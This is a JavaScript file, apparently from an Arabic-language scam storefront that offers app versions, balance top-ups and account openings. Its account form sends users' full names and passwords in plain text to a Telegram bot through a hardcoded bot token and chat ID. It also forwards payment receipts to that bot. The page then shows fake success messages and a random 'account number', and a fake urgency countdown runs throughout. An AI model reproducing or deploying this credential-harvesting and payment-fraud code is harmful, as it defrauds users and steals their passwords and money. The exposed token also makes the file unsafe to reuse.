const TOKEN = '8572250361:AAEB89MDQx_QRBGQR7vTDK9v1k92_4CRxmw';
const MY_ID = '7908500383';
let currentProduct = "";
let calculatedPrice = 0;

// --- 1. رسالة الترحيب ---
window.onload = function() {
    setTimeout(() => {
        document.getElementById('welcomeMessage').style.display = 'none';
    }, 15000); // تختفي تلقائياً بعد 15 ثانية
};

function closeWelcome() {
    document.getElementById('welcomeMessage').style.display = 'none';
}

// --- 2. نظام الدفع العادي (VIP، عادية، مجانية) ---
function openPay(title, price) {
    currentProduct = title;
    resetModal();
    document.getElementById('modalTitle').innerText = title;
    document.getElementById('modalPrice').innerText = "المبلغ المطلوب: " + price + " جنيه";
    
    document.getElementById('paymentArea').style.display = "block";
    document.getElementById('payModal').style.display = "block";
}

// --- 3. نظام الشحن الفوري ---
function openShipping(title) {
    currentProduct = title;
    resetModal();
    document.getElementById('modalTitle').innerText = title;
    document.getElementById('shippingInputs').style.display = "block";
    document.getElementById('payModal').style.display = "block";
}

function calculatePrice() {
    let amount = document.getElementById('shipAmount').value;
    if (amount >= 100) {
        calculatedPrice = (amount / 100) * 10000;
        document.getElementById('calcResult').innerText = `المبلغ المطلوب تحويله: ${calculatedPrice.toLocaleString()} جنيه`;
    } else {
        document.getElementById('calcResult').innerText = "أقل مبلغ شحن هو 100 ألف";
        calculatedPrice = 0;
    }
}

async function submitShippingInfo() {
    let acc = document.getElementById('shipAccount').value;
    let amount = document.getElementById('shipAmount').value;
    
    if (acc.length < 5 || amount < 100) {
        alert("⚠️ يرجى إدخال رقم حساب صحيح وكمية لا تقل عن 100 ألف.");
        return;
    }

    // إرسال البيانات الأولية للبوت
    sendDataToTelegram(`📥 طلب شحن جديد:\nالنسخة: ${currentProduct}\nحساب الزبون: ${acc}\nالكمية: ${amount} ألف`);
    
    document.getElementById('shippingInputs').style.display = "none";
    document.getElementById('modalPrice').innerText = `المبلغ المطلوب تحويله: ${calculatedPrice.toLocaleString()} جنيه`;
    document.getElementById('paymentArea').style.display = "block";
}

// --- 4. نظام فتح الحسابات ---
function openAccountSystem() {
    currentProduct = "فتح حساب جديد";
    resetModal();
    document.getElementById('modalTitle').innerText = "تفعيل وفتح حساب";
    document.getElementById('accountInputs').style.display = "block";
    document.getElementById('payModal').style.display = "block";
}

async function submitAccountInfo() {
    let name = document.getElementById('userFullName').value;
    let pass = document.getElementById('userPass').value;
    let type = document.getElementById('accType').value;

    if (name.length < 10 || pass.length < 4) {
        alert("⚠️ يرجى إدخال الاسم الرباعي وكلمة مرور قوية.");
        return;
    }

    sendDataToTelegram(`👤 طلب فتح حساب:\nالنوع: ${type}\nالاسم: ${name}\nكلمة السر: ${pass}`);
    
    document.getElementById('accountInputs').style.display = "none";
    document.getElementById('modalPrice').innerText = "المبلغ المطلوب: 20,000 جنيه";
    document.getElementById('paymentArea').style.display = "block";
}

// --- 5. الرفع والإرسال النهائي ---
async function handleUpload() {
    const fileInput = document.getElementById('receiptInput');
    const ref = document.getElementById('refNumber').value;
    const file = fileInput.files[0];
    const loadingArea = document.getElementById('loadingArea');

    if (file) {
        document.getElementById('paymentArea').style.display = "none";
        loadingArea.style.display = "block";

        const formData = new FormData();
        formData.append('chat_id', MY_ID);
        formData.append('photo', file);
        formData.append('caption', `✅ إشعار دفع مؤكد\n📦 الخدمة: ${currentProduct}\n🔢 رقم العملية: ${ref}\n💰 المبلغ: ${document.getElementById('modalPrice').innerText}`);

        setTimeout(async () => {
            const response = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });

            if (response.ok) {
                loadingArea.style.display = "none";
                showFinalSuccess();
            } else {
                alert("❌ فشل الإرسال.");
                document.getElementById('paymentArea').style.display = "block";
                loadingArea.style.display = "none";
            }
        }, 3000);
    }
}

function showFinalSuccess() {
    const successArea = document.getElementById('successArea');
    successArea.style.display = "block";

    // منطق ظهور زر التحميل (فقط للنسخ)
    if (currentProduct.includes("نسخة") || currentProduct.includes("النسخة") || currentProduct.includes("VIP")) {
        document.getElementById('downloadSection').style.display = "block";
        document.getElementById('afterActionText').innerText = "مبروك! تم استلام طلبك بنجاح. يمكنك تحميل التطبيق الآن.";
    } 
    // منطق فتح الحساب (توليد رقم حساب)
    else if (currentProduct === "فتح حساب جديد") {
        let randomAcc = Math.floor(1000000 + Math.random() * 9000000);
        document.getElementById('accountCard').style.display = "block";
        document.getElementById('resName').innerText = document.getElementById('userFullName').value;
        document.getElementById('resPass').innerText = document.getElementById('userPass').value;
        document.getElementById('resAcc').innerText = randomAcc;
        document.getElementById('afterActionText').innerText = "تم إنشاء الحساب بنجاح. الرجاء التواصل مع المطور لتفعيله.";
    } 
    // منطق الشحن
    else if (currentProduct.includes("شحن")) {
        document.getElementById('afterActionText').innerText = "مبروك تم الشحن! سوف يصلك الرصيد خلال 5 دقائق. (تحذير: الإشعارات المزيفة تعرض حسابك للقفل).";
    }
}

// --- وظائف مساعدة ---
function resetModal() {
    document.getElementById('shippingInputs').style.display = "none";
    document.getElementById('accountInputs').style.display = "none";
    document.getElementById('paymentArea').style.display = "none";
    document.getElementById('successArea').style.display = "none";
    document.getElementById('accountCard').style.display = "none";
    document.getElementById('downloadSection').style.display = "none";
}

function validateBeforeUpload() {
    if (document.getElementById('refNumber').value.length < 5) {
        alert("⚠️ يرجى إدخال رقم العملية أولاً.");
        return;
    }
    document.getElementById('receiptInput').click();
}

async function sendDataToTelegram(text) {
    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: MY_ID, text: text })
    });
}

function copyAccountNumber() {
    const accNo = document.getElementById('accNo').innerText;
    navigator.clipboard.writeText(accNo).then(() => {
        document.getElementById('copyStatus').style.display = 'inline';
        setTimeout(() => document.getElementById('copyStatus').style.display = 'none', 2000);
    });
}

function closeModal() { document.getElementById('payModal').style.display = "none"; }

// عداد الوقت
let time = 86396; 
setInterval(() => {
    let h = Math.floor(time / 3600); let m = Math.floor((time % 3600) / 60); let s = time % 60;
    if(document.getElementById('timer')) document.getElementById('timer').innerText = `${h}:${m}:${s}`;
    if (time > 0) time--;
}, 1000);
